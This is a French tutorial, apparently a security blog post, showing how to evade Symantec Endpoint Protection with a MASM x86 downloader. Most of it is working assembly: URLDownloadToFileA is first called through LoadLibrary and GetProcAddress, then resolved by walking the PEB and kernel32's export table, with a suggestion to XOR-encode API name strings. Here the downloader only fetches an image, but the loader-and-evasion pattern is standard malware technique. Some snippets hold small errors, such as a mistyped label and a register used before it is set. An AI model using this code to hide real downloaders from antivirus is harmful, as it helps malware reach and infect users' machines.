

Est présentée ici, une simple démonstration d'une technique de contournement (parmis d'autres) d'antivirus (AV). L'AV utilisé sera la version pro de Symantec Endpoint Protection.

Pour illustrer le propos, je vais utiliser un downloader. Le downloader permet en général de télécharger une payload plus volumineuse, mais dans ce cas précis, il me servira à télécharger une image. Donc rien de bien malveillant. Afin de télécharger du contenu, la documentation de l'API de Microsoft (MSDN) nous conseille d'utiliser la fonction __URLDownloadToFile__ qui est contenue dans la librairie __Urlmon.dll__

![image alt text](/images/bypass-antivirus/URLDownloadToFile.png)

J'ai écrit le downloader en assembleur MASM x86 et j'ai utilisé le compilateur MASM32 pour le compiler. Ci dessous est présenté le code de base du downloader utilisé dans cet article.

```
include \masm32\include\masm32rt.inc 
include \masm32\include\urlmon.inc 
includelib \masm32\lib\urlmon.lib 

.586 
.model flat, stdcall 
option casemap:none 

.data 
	host db 'http://wallpapersdsc.net/wp-content/uploads/2015/09/Zooey_Deschanel_88.jpg',0 
	filename db 'zooey.jpg',0 

.code 
start: 
	push 0 
	push 0 
	push offset filename 
	push offset host 
	push 0 
	call URLDownloadToFileA 

exit: 
	push 0 
	call ExitProcess 

end start
```

Le lecteur interessé pourra comparer les paramètres poussés sur la stack avec ceux proposés par la MSDN (voir ci-dessus).

Pour compiler et linker rapidement, j'utilise le script batch ci-dessous:
```
@echo off 
set prog=downloader 
if exist %prog%.exe del %prog%.exe 
\masm32\bin\ml /c /coff /nologo %prog%.asm 
\masm32\bin\Link /SUBSYSTEM:WINDOWS /MERGE:.rdata=.text %prog%.obg > nul 
del %prog%.obj 
pause
```

La compilation fonctionne, et pourtant l'executable n'apparait pas dans le dossier source car celui-ci a été intercepté par l'AV comme on peut le voire ci-dessous:

![image alt text](/images/bypass-antivirus/symantec.png)

Comme le downloader est vraiment très simple, on en conclut que le simple appel à la fonction __URLDownloadToFile__ classe le programme dans la catégorie __Suspicious__ et met alors le programme en quarantaine. Rappelons que le downloader cherche simplement à télécharger une photo .. C'est un peu abusif de la part de l'AV ..

La première idée pour contourner ce problème est de ne plus faire appel à __URLDownloadToFile__ tout en continuant d'utiliser cette fonction. Au lieu d'effectuer un __call URLDownloadToFile__, je vais effectuer un __call eax__ (eax contiendra alors l'addresse d'__URLDownloadToFile__).

Afin de trouver l'adresse d'__URLDownloadToFile__, il faut d'abord que je charge en mémoire la librairie __Urlmon.dll__. Pour cela, je vais utiliser la fonction __LoadLibrary__ qui se trouve dans __kernel32.dll__ (voir MSDN). Puis pour trouver l'adresse d'__URLDownloadToFile__, je vais utiliser la fonction __GetProcAddress__ qui se trouve aussi dans __kernel32.dll__ (voir msdn).

__LoadLibrary__ prend en paramètre une chaine de charactères correspondant à la librairie que l'on veut charger. Quant à __GetProcAddress__, elle prend en paramètre une chaine de charactères correspondant au nom de la fonction dont on cherche l'adresse, ainsi que le handle de la librairie chargée (retour de __LoadLibrary__) qui contient la fonction recherchée. Le code du downloard est modifié comme suit:

```
include \masm32\include\masm32rt.inc 

.586 
.model flat, stdcall 
option casemap:none 

.data 
	host db 'http://wallpapersdsc.net/wp-content/uploads/2015/09/Zooey_Deschanel_88.jpg', 0 
	filename db 'zooey.jpg', 0 
	lib_Urlmon db 'Urlmon.dll', 0
	func_URLDownloadToFile db 'URLDownloadToFileA', 0

.code 
start: 
	push offset lib_Urlmon
	call LoadLibrary ; eax contient un handle vers Urlmon.dll

	push offset fun_URLDownloadToFile
	push eax
	call GetProcAddress ; eax contient maintenant l'adresse de URLDownloadToFile

	push 0 
	push 0 
	push offset filename 
	push offset host 
	push 0 
	call eax

exit: 
	push 0 
	call ExitProcess 

end start
```

Une fois compilé et linké, on se rend compte que l'AV ne classe plus ce programe comme malveillant. C'est un **quick win**, mais essayons d'aller un peu plus loin.

Cette méthode est souvent utilisée dans les malwares et il est possible que l'appel à la fonction __LoadLibrary__ puis successivement à __GetProcAddress__ soit considérée comme malveillante. Il faudrait alors pouvoir se passer de l'appel direct à ces fonctions et utiliser un __call eax__. Mais pour trouver l'adresse de __LoadLibrary__, j'ai besoin de __LoadLibrary__ et de __GetProcAddress__ ...

Il existe une solution à ce problème. Chaque processus contient une structure qui s'appelle le __PEB__ (Process Environment Block) et qui contient de nombreuses informations sur le processus en cours. Notamment une liste chainée qui contient les adresses des librairies chargées en mémoire au démarage de la machine (ntdll.dll suivie de kernel32.dll, ...). Rappelons que Kernel32.dll est la librairie qui contient __LoadLibrary__ et __GetProcAddress__.

Il faut alors trouver l'adresse de __Kernel32.dll__ afin de trouver les adresses de __LoadLibrary__ et __GetProcAddress__. Pour cela, il faut trouver l'adresse du __PEB__, puis parcourir cette fameuse liste chainée.

Pour un processus x86, l'adresse du __PEB__ est toujours située dans le segment __FS__ à l'offset __0x30__ (à titre indicatif, il est dans le segment __GS__ à l'offset __0x60__ pour un processus x64). Il faut ensuite retrouver l'adresse de la structure __PEB\_LDR\_DATA__ qui est à l'offset __0x0C__ du __PEB__. Enfin, retrouver l'adresse de la liste chainée dont nous parlions (__InInitializationOrderModuleList__) qui est à l'offset __0x1C__ de la structure __PEB_LDR_DATA__. Et enfin, l'adresse de __kernel32.dll__ qui se trouve à l'offset __0x08__ (car c'est toujours la deuxième librairie chargée en mémoire. La première étant __ntdll.dll__, à l'offset __0x04__) de __InInitializationOrderModuleList__. Tout cela se traduit par le code suivant:

```
xor ecx, ecx 
add ecx, fs:[ecx+30h] ; PEB 
mov ecx, [ecx+0Ch]    ; PEB\_LDR\_DATA 
mov esi, [esi+1Ch]    ; InInitializationOrderModuleList 
lodsd                 ; charge esi dans eax 
mov edx, [eax+08h]    ; edx: adresse de kernel32.dll
```

Il est possible de connaitre la structure du __PEB__ en utilisant le debugger windbg (dt ntdll!\_PEB @$peb -r). Le site (http://undocumented.ntinternals.net/index.html?page=UserMode%2FStructures%2FPEB_LDR_DATA.html) permet de connaitre les fonctions et structures non documentées de ntdll.dll.

Pour trouver une fonction dans une librairie, une des méthodes consiste à regarde dans l'__Export Address Table__ (EAT) qui contient l'ensemble des adresses pointant vers les fonctions exportées par la librairie. Afin de rechercher dans l'__EAT__ il est nécessaire de parcourir l'__Export Directory Table__, l'__Export Name Pointer Table__, l'__Export Ordinal Table__. Il est recommandé de regarder la MSDN pour connaitre le sens de ces tableaux (https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#export-directory-table). C'est la méthode qui sera utilisée ici. Le code ci-dessous permet de trouver l'__Export Directory Table__ en ayant dans __edx__ l'adresse de la librairie (kernel32.dll dans ce cas)

```
mov ebx, [edx+03Ch]     ; eax = offset signature PE dans Kernel32 
mov ebx, [edx+ebx+078h] ; ebx = offset Export Directory Table dans Kernel32 
add ebx, edx            ; adresse de Export Directory Table dans ebx
```

Le code ci-dessous permet de parcourir l'ensemble des tableaux présentés ci-dessus et de retrouver l'adresse de __GetProcAddress__. La même chose peut être fait pour retrouver l'adresse de __LoadLibrary__:

```
include \masm32\include\masm32rt.inc 

.586 
.model flat, stdcall 
option casemap:none 

.data 
	host db 'http://wallpapersdsc.net/wp-content/uploads/2015/09/Zooey_Deschanel_88.jpg',0 
	filename db 'zooey.jpg',0 
	lib_Urlmon db 'Urlmon.dll', 0 
	func_URLDownloadToFileA db 'URLDownloadToFileA',0 
	func_GetProcAddress db 'GetProcAddress',0 
	func_LoadLibrary db 'LoadLibrary',0 

.code 
start: 
	xor eax, eax 
	xor ebx, ebx 
	xor ecx, ecx 
	xor esi, esi 
	xor edi, edi 
findKernel32: 
	assume fs:nothing 
	add ecx, fs:[ecx+30h] ; adresse du PEB dans ecx 
	assume fs:error 
	mov ecx, [ecx+0Ch] ; adresse de PEB\_LDR\_DATA dans ecx 
	mov esi, [ecx+1Ch] ; adresse de InInitializationOrderModuleList dans esi 
	lodsd ; load esi into eax 
	mov edx, [eax+08h] ; adresse de kernel32.dll !!! 
findEDT:  ; find Export Directory Table
	mov ebx, [edx+03Ch] ; eax = offset signature PE dans Kernel32 
	mov ebx, [edx+ebx+078h] ; ebx = offset Export Directory Table dans Kernel32 
	add ebx, edx ; adresse de Export Directory Table dans ebx 
findGPA: ; find GetProcAddress
	mov ecx, [ebx+18h] ; ecx = nbre de fonctions exportées (compteur) 
	mov eax, [ebx+20h] ; eax = Offset Export Name Pointer Table dans Kernel32 
	add eax, edx ; adresse de Export Name Pointer Table dans eax 
parseENPT: ; parcourt Export Name Pointer Table
	dec ecx ; decremente le compte nombre exports push offset func\_GetProcAddress 
	push offset func_GetProcAddress ; offset de getprocaddress
	pop edi ; contient 'GetProcAddress' 
	mov	esi, [eax+ecx\*4] ; esi = ordinal 'NomFonction\n' dans Name Pointer Table 
	add esi, edx ; esi = adresse 'NomFonction\n' dans Name Pointer Table 
	push ecx ; sauvegarde ecx 
	xor ecx, ecx 
	add cl, 14 ; ecx = nbre caractères dans GetProcAddress 
	repe cmpsb ; compare chaines edi et esi 
	pop ecx ; ecx = compteur nombre exports 
	jnz parseENPT 
	mov eax, [ebx+024h] ; eax = offset Ordinal Table dans Kernel32 
	add eax, edx ; eax = adresse Ordinal Table 
	mov cx, [eax+ecx\*2] ; cx = ordinal de la fonction - numéro du 1er ordinal 
	mov ax, [ebx+010h] ; eax = numéro du premier ordinal de la table 
	add cx, ax ; cx = ordinal de la fonction 
	dec cx ; pour tomber juste (ordinal débute à 0) 
	mov eax, [ebx+01Ch] ; eax = offset Export Address Table 
	add eax, edx ; eax = adresse Export Address Table 
	mov eax, [eax+ecx\*4] ; eax = offset de GetProcAddress dans Kernel32 
	add eax, edx ; eax = adresse GetProcAddress 

	push eax
	pop ebx ; utiliser apres l'appel à LoadLibrary
	push offset lib\_Urlmon 
	call LoadLibrary 

	push offset func\_URLDownloadToFileA 
	push eax ; handle urlmon.dll 
	call ebx ; ebx: adresse de GetProcAddress -> eax: adresse de UrlDownloadToFileA 

	push 0 
	push 0 
	push offset filename 
	push offset host 
	push 0 
	call eax ; eax: adresse de UrlDownloadToFileA 
exit: 
	push 0 
	call ExitProcess 
end start
```

Ci-dessous on peut voir que la fonction __GetProcAddress__ n'apparait plus dans la table des imports (IAT: Import Address Table).

![image alt text](/images/bypass-antivirus/cffexplorer.png)

Certains AV peuvent encore regarder dans la section .data et trouver en clair les chaines de charactères __UrlDownloadToFileA__, __LoadLibrary__ et __GetProcAddress__, ce qui peut paraitre suspect. Il suffit dans ce cas d'encoder ces chaines de charactères avec un __xor__, ou un __add__, ... puis de les décoder lors de l'execution du programme.

Cette méthode permet de contourner une grande partie des AV, mais contre un Endpoint Detection and Response (EDR), cela s'avère un peu plus compliqué, car les EDRs ont généralement un module kernel chargé en mémoire qui "hook" certaines fonctions "suspectes". L'EDR peut alors analyser un programme en cours d'execution, et le classer comme malveillant sitôt que celui-ci fait appel à certaines fonctions ou exécute plusieurs fonctions "suspectes" les unes à la suite des autres.
